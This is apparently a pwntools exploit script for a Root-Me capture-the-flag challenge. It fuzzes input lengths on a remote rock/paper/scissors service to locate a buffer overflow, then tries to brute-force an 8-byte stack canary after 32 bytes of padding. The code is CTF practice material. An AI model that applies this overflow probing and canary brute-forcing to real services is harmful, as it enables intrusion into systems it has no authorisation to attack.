from pwn import *
import random
import itertools

chal_url = "challenge03.root-me.org"
chal_port= 56543

def chal_con():
	return remote(chal_url, chal_port)

def input_generator(size):
	def input_gen():
		return "A"*size
	return input_gen
	
def player_input_generator():
	return random.choice("rock/paper/scissors".split("/"))

def play(input_gen_func = player_input_generator, display = False):
	r = chal_con()
	ret_progress = 0
	try:
		while True:
			rl = r.readuntil(":")
			if display:
				print rl
			r.send(input_gen_func())
			rl = r.readline()
			if display:
				print rl
			ret_progress+=1
			rl = r.readline()
			if display:
				print rl		
			ret_progress+=1
	except:
		pass
	r.close()
	return ret_progress

def determine_interesting_input_sizes():
	ret = {}
	count = play(display=True)
	new_count = count

	size = 5
	print 'count =',count,'size = ',size
	ret[count] = size
	while count == new_count:
		new_count = play(display=False, input_gen_func = input_generator(size))
		size +=1
	count = new_count
	print 'count =',count,'size = ',size
	ret[count] = size
	
	size = 290
	print 'count =',count,'size = ',size
	while count == new_count:
		new_count = play(display=False, input_gen_func = input_generator(size))
		size +=1
	count = new_count
	print 'count =',count,'size = ',size
	ret[count] = size
	return ret
	
#~ dic = determine_interesting_input_sizes()
dic = {0: 514, 1: 34, 2: 5}
#~ print dic



#~ print play(display = False, input_gen_func = lambda : "A"*32)

#~ print play(display = False, input_gen_func = lambda : "A"*33)

byte_values = [chr(i) for i in range(0x100)]
for guess_cookie in itertools.product(byte_values,repeat = 8):
	string_test = "{}{}".format("A"*32,''.join(guess_cookie))
	if 1 != play(display = False, input_gen_func = lambda : string_test):
		print "ohh yeah",string_test
		open("/tmp/test.result",'w').write(string_test)
		break;



